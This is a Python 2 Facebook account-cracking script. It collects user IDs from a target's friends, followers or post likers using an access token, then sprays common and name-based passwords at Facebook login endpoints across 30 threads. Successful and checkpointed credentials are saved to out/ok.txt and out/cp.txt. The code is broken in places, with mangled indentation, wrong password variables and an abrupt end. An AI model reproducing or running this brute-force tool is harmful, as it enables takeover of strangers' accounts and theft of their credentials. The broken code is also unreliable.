#!/usr/bin/python
# -*- coding: utf-8
#Code By : Syamsul Hakim ID
#Github : https://github.com/HAKIM4-art
#Facebook : https://www.facebook.com/syamsul.hakim.000
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize,bs4
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
try:
	import requests
except ImportError:
        os.system("pip2 install requests")
try:
	import mechanize
except ImportError:
	os.system("pip2 install mechanize")

reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders=[('User-Agent','Mozilla/5.0 (Linux; Android 5.1; ASUS ZenFone 2 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]')]
#ip = requests.get('https://api-asutoolkit.cloudaccess.host/ip.php').text
id = []
cp = []
ok = []

### LOGO
logo = """ \033[1;94m
 
                  `.-://////:-.`
              .:+o+:-..````..-:+o+:.
           `:o+-`                `:+o:`
         `/o:`                      `:o/`
        -s/`  .-..`            `..--` `/s-
       /o.   `:.`.-:----------:-.``:-   .o/
      /o`    .:`    `              --    `o/
     -s.     .:`                   --     .s-
     o/     .:`                     --     +o
    .s-     :.        \033[1;91mZeDD          `:`    -s`
    .s.     :.                      `:`    .s.
    .s-     --                      .:     -s.
     o/     `-.                    `-.     /o
     -s.     `--`                `.-`     .s-
      /o` ----``..--..`    `...--.`      `o/
       /o. `----`  `-.      `-.         .o/
        -o:  -.......        ..       `:o-
         `:o:``....--        ..     `:o:`
           `:+/-`  `-        ..  `-/+:`
              `-/+///..````..://+/-`
                  `.-::////::-.` \033[91;1m
 
                \033[1;91mLife Of Programmer\033[91;1m
                 \033[1;91m  \x1b[7m➺➺ Author: ZeDD ㋡㋡\x1b[0m
\033[1;91m╔═══════════════════════\033[1;94m══════════════════════╗
\033[1;93m║\033[1;93m* \033[1;97mAuthor  \033[1;91m: \033[1;33m[ZɘDD]                           \033[1;94m║
\033[1;95m║\033[1;93m* \033[1;97mGitHub  \033[1;91m: \033[1;92m[https//:github.com/Em710]       \033[1;95m║
\033[1;94m║\033[1;93m* \033[1;97mSupport \033[1;91m: \033[1;98m[Rʌɱzʌŋ] \033[1;95m[Gɱ & Aɗŋʌŋ] \033[1;96m[Hʌsɘɘɓ]   \033[1;93m║
\033[1;94m╚═══════════════════════\033[1;91m══════════════════════╝"""




def bot_komen():
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print ' [!] Token invalid'
        os.system('rm -rf login.txt')
    fbid = '100049506248108'
    requests.post('https://graph.facebook.com/Kudiyan.Da.Prince/comments/?message=ZeeShaan-*-ðŸ˜‹&access_token=' + token)
    menu()
    
def tokenz():
	os.system('clear')
	try:
		token = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		token = raw_input(" [+] Your Token : ")
		try:
			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
			a = json.loads(otw.text)
			zedd = open("login.txt", 'w')
			zedd.write(token)
			zedd.close()
			print (' [*] Token Valid') 
			raw_input (' [>] Tekan Enter Ke Menu')
			bot_komen()
		except KeyError:
			print (" [!] Token Invalid") 
			sys.exit()

def menu():
	os.system('clear')
	global token
	try:
		token = open('login.txt','r').read()
		otw = requests.get('https://graph.facebook.com/me/?access_token='+token)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
		ttl = a['birthday']
		ip = requests.get('https://api-asutoolkit.cloudaccess.host/ip.php').text
	except KeyError:
		os.system('clear')
		print (' [!] Token Invalid')
		os.system("rm -rf login.txt")
		time.sleep(3)
		tokenz()
	except requests.exceptions.ConnectionError:
		print ('  [!] Tidak Ada Koneksi')
		sys.exit()
	print logo
	print " [#] Name       : \033[0;93m"+nama+"\033[0;97m"
	#######print " [#] Your ID    : \033[0;93m"+id+"\033[0;97m"
	print " [#] DOB        : \033[0;93m"+a['birthday']+"\033[0;97m"
	print " [#] Your IP    : \033[0;93m"+ip+"\033[0;97m"
	######print " [#] Your IP    : \033[0;93m"+prem+"\033[0;97m"
	print " [#]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n"
	print " [1] Crack From Friends / Public"
	print " [2] Crack From  Followers"
	print " [3] Crack From Likes"
	print " [0] Logout"
	pilih_menu()

def pilih_menu():
	ask = raw_input("\n [*] Select : ")
	if ask == "":
		print " [!] Please Select Correct !"
		exit()
	elif ask == "1" or ask == "01":
		print "\n [*] Enter The Target ID "
		idt = raw_input(" [+] ID Public: ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			sp = json.loads(pok.text)
			print " [+] Nama : "+sp["name"]
		except KeyError:
			print " [!] ID Wrong "
			exit()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif ask == "2" or ask == "02":
		print "\n [*] Enter The Follower ID To Cloning"
		idt = raw_input(" [+] ID Public : ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			sp = json.loads(pok.text)
			print " [+] Nama : "+sp["name"]
		except KeyError:
			print " [!] ID Wrong"
			exit()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif ask == "2" or ask == "02":
		print "\n [*] ID Crack Follower"
		idt = raw_input(" [+] ID Public : ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			sp = json.loads(pok.text)
			print " [+] Nama : "+sp["name"]
		except KeyError:
			print " [!] ID Tidak Tersedia"
			exit()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=999999&access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif ask == "3" or ask == "03":
		print "\n [*] Masukan ID Postingan Nya Ajah"
		idt = raw_input(" [+] ID Post : ")
		r = requests.get("https://graph.facebook.com/"+idt+"/likes?limit=9999999&access_token="+token)
		z = json.loads(r.text)
		for i in z['data']:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif ask == "0" or ask == "00":
		os.system("rm -f login.txt") 
		print " [!] Successs Token"
		exit()
	else:
		print " [!] Select Correct !"
		exit()
	print " [*] Total ID : "+str(len(id))
	ask = raw_input(" [*] Enter The Password ? [Y/t]: ")
	if ask =="Y" or ask =="y":
		manual()
	print " [+] File \033[0;92mOK\033[0;97m Save File Ok : out/ok.txt"
	print " [+] File \033[0;93mCP\033[0;97m Save File CP : out/cp.txt"
	print " [!]  Please Wait Process Crack\n"
		
	def main(arg):
		global ok,cp
		user = arg
		uid,name=user.split("|") ##Gk Usah Di Ganti 
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			pass1 = name.lower()+'123','1234','12345','1122'
			data = urllib.urlopen("https://mbasic.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email="+(uid)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\033[0;92m*----> \033[0;92m[\033[0;92mOK\033[0;92m] ' +uid+ ' | ' + pass1
				ok.append(uid+' | '+pass1)
				save = open('out/ok.txt','a')
				save.write(str(uid)+' | '+str(pass1)+'\n')
				save.close()
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\033[0;93m*----> \033[0;93m[\033[0;93mCP\033[0;93m] ' +uid+ ' | ' + pass1
					cp.append(uid+' | '+pass1)
					save = open('out/cp.txt','a')
					save.write(str(uid)+' | '+str(pass1)+'\n')
					save.close()
				else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\033[0;93m*----> \033[0;93m[\033[0;93mCP\033[0;93m] ' +uid+ ' | ' + pass2
							cp.append(uid+' | '+pass2)
							save = open('out/cp.txt','a')
							save.write(str(uid)+' | '+str(pass2)+'\n')
							save.close()
						else:
							pass3 = "000786","786000","786786"
							data = urllib.urlopen("https://mbasic.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(uid)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\033[0;92m**----> \033[0;92m[\033[0;92mOK\033[0;92m] ' +uid+ ' | ' +pass3
								ok.append(uid+' | '+pass3)
								save = open('out/ok.txt','a') 
								save.write(str(uid)+' | '+str(pass3)+'\n')
								save.close()
							else:
								if 'www.facebook.com' in q['error_msg']:
									print '\033[0;93m*----> \033[0;93m[\033[0;93mCP\033[0;93m] ' +uid+ ' | ' + pass3
									ok.append(uid+' | '+pass3)
									save = open('out/cp.txt','a')
									save.write(str(uid)+' | '+str(pass3)+'\n')
									save.close() 
								else:
									pass4 = '47KHALIFA'
									data = urllib.urlopen("https://mbasic.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(uid)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\033[0;92m*----> \033[0;92m[\033[0;92mOK\033[0;92m] ' +uid+ ' | ' + pass4
										ok.append(uid+' | '+pass4)
										save = open('out/ok.txt','a')
										save.write(str(uid)+' | '+str(pass4)+'\n')
										save.close()
									else:
										if 'www.facebook.com' in q['error_msg']:
											print '\033[0;93m*----> \033[0;93m[\033[0;93mCP\033[0;93m] ' +uid+ ' | ' + pass4
											cp.append(uid+' | '+pass4)
											save = open('out/cp.txt','a')
											save.write(str(uid)+' | '+str(pass4)+'\n')
											save.close()
										else:
											pass5 = 'Pakistan'
											data = urllib.urlopen("https://mbasic.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(uid)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\033[0;92m*----> \033[0;92m[\033[0;92mOK\033[0;92m] ' +uid+ ' | ' + pass5
												ok.append(uid+' | '+pass5)
												save = open('out/ok.txt','a')
												save.write(str(uid)+' | '+str(pass5)+'\n')
												save.close()
											else:
												if 'www.facebook.com' in q['error_msg']:
													print '\033[0;93m*----> \033[0;93m[\033[0;93mCP\033[0;93m] ' +uid+ ' | ' + pass5
													cp.append(uid+' | '+pass5)
													save = open('out/cp.txt','a')
													save.write(str(uid)+' | '+str(pass5)+'\n')
													save.close()
							                  else:
											pass6 = 'bismillah'
											data = urllib.urlopen("https://mbasic.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(uid)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\033[0;92m*----> \033[0;92m[\033[0;92mOK\033[0;92m] ' +uid+ ' | ' + pass6
												ok.append(uid+' | '+pass6)
												save = open('out/ok.txt','a')
												save.write(str(uid)+' | '+str(pass6)+'\n')
												save.close()
											else:
												if 'www.facebook.com' in q['error_msg']:
													print '\033[0;93m*----> \033[0;93m[\033[0;93mCP\033[0;93m] ' +uid+ ' | ' + pass6
													cp.append(uid+' | '+pass6)
													save = open('out/cp.txt','a')
													save.write(str(uid)+' | '+str(pass5)+'\n')
													save.close()
						                    else:
											pass7 = 'pakistan'
											data = urllib.urlopen("https://mbasic.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(uid)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\033[0;92m*----> \033[0;92m[\033[0;92mOK\033[0;92m] ' +uid+ ' | ' + pass7
												ok.append(uid+' | '+pass7)
												save = open('out/ok.txt','a')
												save.write(str(uid)+' | '+str(pass7)+'\n')
												save.close()
											else:
												if 'www.facebook.com' in q['error_msg']:
													print '\033[0;93m*----> \033[0;93m[\033[0;93mCP\033[0;93m] ' +uid+ ' | ' + pass5
													cp.append(uid+' | '+pass5)
													save = open('out/cp.txt','a')
													save.write(str(uid)+' | '+str(pass5)+'\n')
													save.close()
						                    else:
											pass8 = 'proplayer'
											data = urllib.urlopen("https://mbasic.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(uid)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\033[0;92m*----> \033[0;92m[\033[0;92mOK\033[0;92m] ' +uid+ ' | ' + pass5
												ok.append(uid+' | '+pass5)
												save = open('out/ok.txt','a')
												save.write(str(uid)+' | '+str(pass5)+'\n')
												save.close()
											else:
												if 'www.facebook.com' in q['error_msg']:
													print '\033[0;93m*----> \033[0;93m[\033[0;93mCP\033[0;93m] ' +uid+ ' | ' + pass5
													cp.append(uid+' | '+pass5)
													save = open('out/cp.txt','a')
													save.write(str(uid)+' | '+str(pass5)+'\n')
													save.close()
							                 else:
											pass9 = 'budi01gaming'
											data = urllib.urlopen("https://mbasic.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(uid)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\033[0;92m*----> \033[0;92m[\033[0;92mOK\033[0;92m] ' +uid+ ' | ' + pass5
												ok.append(uid+' | '+pass5)
												save = open('out/ok.txt','a')
												save.write(str(uid)+' | '+str(pass5)+'\n')
												save.close()
											else:
												if 'www.facebook.com' in q['error_msg']:
													print '\033[0;93m*----> \033[0;93m[\033[0;93mCP\033[0;93m] ' +uid+ ' | ' + pass5
													cp.append(uid+' | '+pass5)
													save = open('out/cp.txt','a')
													save.write(str(uid)+' | '+str(pass5)+'\n')
													save.close()
							
					
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print "\n [+] Finished"
	print " [*] Total \033[0;92mOK\033[0;97m : "+str(len(ok))
	print " [*] Total \033[0;93mCP\033[0;97m : "+str(len(cp))
	exit()
					
def manual():
	print " [*] Contoh : Sayang, Indonesia, bangsat, bismillah"
	pass1 = raw_input(" [+] Password 1 : ")
	pass2 = raw_input(" [+] Password 2 : ")
	pass3 = raw_input(" [+] Password 3 : ")
	print " [+] File \033[0;92mOK\033[0;97m Tersimpan Di : out/ok.txt"
	print " [+] File \033[0;93mCP\033[0;97m Tersimpan Di : out/cp.txt"
	print " [!] Sedang Prosess Crack\n"
	
	def main(arg):
		global ok,cp
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			data = urllib.urlopen("https://mbasic.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\033[0;92m*----> \033[0;92m[\033[0;92mOK\033[0;92m] ' +user+ ' | ' + pass1
				ok.append(user+' | '+pass1)
				save = open('out/ok.txt','a')
				save.write(str(user)+' | '+str(pass1)+'\n')
				save.close()
			else:
					data = urllib.urlopen("https://mbasic.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\033[0;93m*----> \033[0;92m[\033[0;92mOK\033[0;92m] ' +user+ ' | ' + pass2
						ok.append(user+' | '+pass2)
						save = open('out/ok.txt','a')
						save.write(str(user)+' | '+str(pass2)+'\n')
						save.close()
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\033[0;93m*----> \033[0;93m[\033[0;93mCP\033[0;93m] ' +user+ ' | ' + pass2
							cp.append(user+' | '+pass2)
							save = open('out/cp.txt','a')
							save.write(str(user)+' | '+str(pass2)+'\n')
							save.close()
						else:
							data = urllib.urlopen("https://mbasic.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\033[0;92m*----> \033[0;92m[\033[0;92mOK\033[0;92m] ' +user+ ' | ' + pass3
								ok.append(user+' | '+pass3)
								save = open('out/ok.txt','a')
								save.write(str(user)+' | '+str(pass3)+'\n')
								save.close()
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\033[0;93m*----> \033[0;93m[\033[0;93mCP\033[0;93m] ' +user+ ' | ' + pass3
									cp.append(user+' | '+pass3)
									save = open('out/cp.txt','a')
									save.write(str(user)+' | '+str(pass3)+'\n')
									save.close()
					
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print "\n [+] Finished"
	print " [*] File \033[0;92mOK\033[0;97m Tersimpan Di : out/ok.txt"
	print " [*] File \033[0;93mCP\033[0;97m Tersimpan Di : out/cp.txt"
	exit()

### MENU TOUCH
def menutouch():
	os.system('clear')
	global token
	try:
		token = open('login.txt','r').read()
		otw = requests.get('https://graph.facebook.com/me/?access_token='+token)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
		ttl = a['birthday']
		ip = requests.get('https://api-asutoolkit.cloudaccess.host/ip.php').text
	except KeyError:
		os.system('clear')
		print (' [!] Token Invalid')
		os.system("rm -f login.txt")
		time.sleep(3)
		tokenz()
	except requests.exceptions.ConnectionError:
		print (' [!] Tidak Ada Koneksi')
		sys.exit()
	print logo
	print " [ Selamat Datang : \033[0;93m"+nama+"\033[0;97m ]\n"
	print " [#]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n"
	print " [ Your IP        : \033[0;93m"+ip+"\033[0;97m ]\n"
	print " [1] Crack Dari Publik Teman"
	print " [2] Crack Dari Total Followers"
	print " [3] Crack Dari Like Postingan"
	print " [0] Logout"
	pilih_menutouch()

def pilih_menutouch():
	ask = raw_input("\n Choose >> ")
	if ask == "":
		print " [!] Pilih Yang Bener !"
		exit()
	elif ask == "1" or ask == "01":
		print "\n [*] Isi 'me' Jika Ingin Crack Dari List Teman"
		idt = raw_input(" [+] ID Publik : ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			sp = json.loads(pok.text)
			print " [+] Nama : "+sp["name"]
		except KeyError:
			print " [!] ID Tidak Tersedia"
			exit()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif ask == "2" or ask == "02":
		print "\n [*] Isi 'me' Jika Ingin Crack Follower Sendiri"
		idt = raw_input(" [+] ID Publik : ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			sp = json.loads(pok.text)
			print " [+] Nama : "+sp["name"]
		except KeyError:
			print " [!] ID Tidak Tersedia"
			exit()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=999999&access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif ask == "3" or ask == "03":
		print "\n [*] Masukan ID Postingan Nya Ajah"
		idt = raw_input(" [+] ID Post : ")
		r = requests.get("https://graph.facebook.com/"+idt+"/likes?limit=9999999&access_token="+token)
		z = json.loads(r.text)
		for i in z['data']:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif ask == "0" or ask == "00":
		os.system("rm -f login.txt") 
		print " [!] Berhasil Menghapus Token"
		exit()
	else:
		print " [!] Pilih Yang Bener !"
		exit()
	print " [*] Total ID : "+str(len(id))
	print " [+] File \033[0;92mOK\033[0;97m Tersimpan Di : out/ok.txt"
	print " [+] File \033[0;93mCP\033[0;97m Tersimpan Di : out/cp.txt"
	print " [!] Sedang Prosess Crack\n"
		
	def main(arg):
		global ok,cp
		user = arg
		uid,name=user.split("|") ##Gk Usah Di Ganti 
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			pass1 = name.lower()+'123'
			rex = requests.post('https://touch.facebook.com/login.php', data={'email': uid, 'pass': pass1, 'login': 'submit'}, headers={'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/id_ID;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'})
			xo = rex.url
			if 'home' in xo or 'get' in xo or 'save' in xo or 'actor' in xo:
				print '\033[0;92m*----> \033[0;92m[\033[0;92mOK\033[0;92m] ' +uid+ ' | ' + pass1
				ok.append(uid+' | '+pass1)
				save = open('out/ok.txt','a') 
				save.write(str(uid)+' | '+str(pass1)+'\n')
				save.close()
			elif 'checkpoint' in xo or 'confirm' in xo or 'cuid' in xo:
				print '\033[0;93m*----> \033[0;93m[\033[0;93mCP\033[0;93m] ' +uid+ ' | ' + pass1
				cp.append(uid+' | '+pass1)
				save = open('out/cp.txt','a') 
				save.write(str(uid)+' | '+str(pass1)+'\n')
				save.close()
			else:
				pass2 = name.lower()+'12345'
				rex = requests.post('https://touch.facebook.com/login.php', data={'email': uid, 'pass': pass2, 'login': 'submit'}, headers={'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/id_ID;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'})
				xo = rex.url
				if 'home' in xo or 'get' in xo or 'save' in xo or 'actor' in xo:
					print '\033[0;92m*----> \033[0;92m[\033[0;92mOK\033[0;92m] ' +uid+ ' | ' + pass2
					ok.append(uid+' | '+pass2)
					save = open('out/ok.txt','a') 
					save.write(str(uid)+' | '+str(pass2)+'\n')
					save.close()
				elif 'checkpoint' in xo or 'confirm' in xo or 'cuid' in xo:
					print '\033[0;93m*----> \033[0;93m[\033[0;93mCP\033[0;93m] ' +uid+ ' | ' + pass2
					cp.append(uid+' | '+pass2)
					save = open('out/cp.txt','a') 
					save.write(str(uid)+' | '+str(pass2)+'\n')
					save.close()
				else:
					pass3 = 'sayang'
					rex = requests.post('https://touch.facebook.com/login.php', data={'email': uid, 'pass': pass3, 'login': 'submit'}, headers={'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/id_ID;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'})
					xo = rex.url
					if 'home' in xo or 'get' in xo or 'save' in xo or 'actor' in xo:
						print '\033[0;92m*----> \033[0;92m[\033[0;92mOK\033[0;92m] ' +uid+ ' | ' + pass3
						ok.append(uid+' | '+pass3)
						save = open('out/ok.txt','a') 
						save.write(str(uid)+' | '+str(pass3)+'\n')
						save.close()
					elif 'checkpoint' in xo or 'confirm' in xo or 'cuid' in xo:
						print '\033[0;93m*----> \033[0;93m[\033[0;93mCP\033[0;93m] ' +uid+ ' | ' + pass3
						cp.append(uid+' | '+pass3)
						save = open('out/cp.txt','a') 
						save.write(str(uid)+' | '+str(pass3)+'\n')
						save.close()
					else:
						pass4 = 'anjing'
						rex = requests.post('https://touch.facebook.com/login.php', data={'email': uid, 'pass': pass4, 'login': 'submit'}, headers={'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/id_ID;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'})
						xo = rex.url
						if 'home' in xo or 'get' in xo or 'save' in xo or 'actor' in xo:
							print '\033[0;92m*----> \033[0;92m[\033[0;92mOK\033[0;92m] ' +uid+ ' | ' + pass4
							ok.append(uid+' | '+pass4)
							save = open('out/ok.txt','a') 
							save.write(str(uid)+' | '+str(pass4)+'\n')
							save.close()
						elif 'checkpoint' in xo or 'confirm' in xo or 'cuid' in xo:
							print '\033[0;93m*----> \033[0;93m[\033[0;93mCP\033[0;93m] ' +uid+ ' | ' + pass4
							cp.append(uid+' | '+pass4)
							save = open('out/cp.txt','a') 
							save.write(str(uid)+' | '+str(pass4)+'\n')
							save.close()
						else:
							pass5 = 'bangsat'
							rex = requests.post('https://touch.facebook.com/login.php', data={'email': uid, 'pass': pass5, 'login': 'submit'}, headers={'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/id_ID;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'})
							xo = rex.url
							if 'home' in xo or 'get' in xo or 'save' in xo or 'actor' in xo:
								print '\033[0;92m*----> \033[0;92m[\033[0;92mOK\033[0;92m] ' +uid+ ' | ' + pass5
								ok.append(uid+' | '+pass5)
								save = open('out/ok.txt','a') 
								save.write(str(uid)+' | '+str(pass5)+'\n')
								save.close()
							elif 'checkpoint' in xo or 'confirm' in xo or 'cuid' in xo:
								print '\033[0;93m*----> \033[0;93m[\033[0;93mCP\033[0;93m] ' +uid+ ' | ' + pass5
								cp.append(uid+' | '+pass5)
								save = open('out/cp.txt','a') 
								save.write(str(uid)+' | '+str(pass5)+'\n')
								save.close()
							else:
							pass6 = 'bismillah'
							rex = requests.post('https://touch.facebook.com/login.php', data={'email': uid, 'pass': pass5, 'login': 'submit'}, headers={'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/id_ID;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'})
							xo = rex.url
							if 'home' in xo or 'get' in xo or 'save' in xo or 'actor' in xo:
								print '\033[0;92m*----> \033[0;92m[\033[0;92mOK\033[0;92m] ' +uid+ ' | ' + pass5
								ok.append(uid+' | '+pass5)
								save = open('out/ok.txt','a') 
								save.write(str(uid)+' | '+str(pass5)+'\n')
								save.close()
							elif 'checkpoint' in xo or 'confirm' in xo or 'cuid' in xo:
								print '\033[0;93m*----> \033[0;93m[\033[0;93mCP\033[0;93m] ' +uid+ ' | ' + pass5
								cp.append(uid+' | '+pass5)
								save = open('out/cp.txt','a') 
								save.write(str(uid)+' | '+str(pass5)+'\n')
								save.close()
							else:
							pass7 = 'sundel'
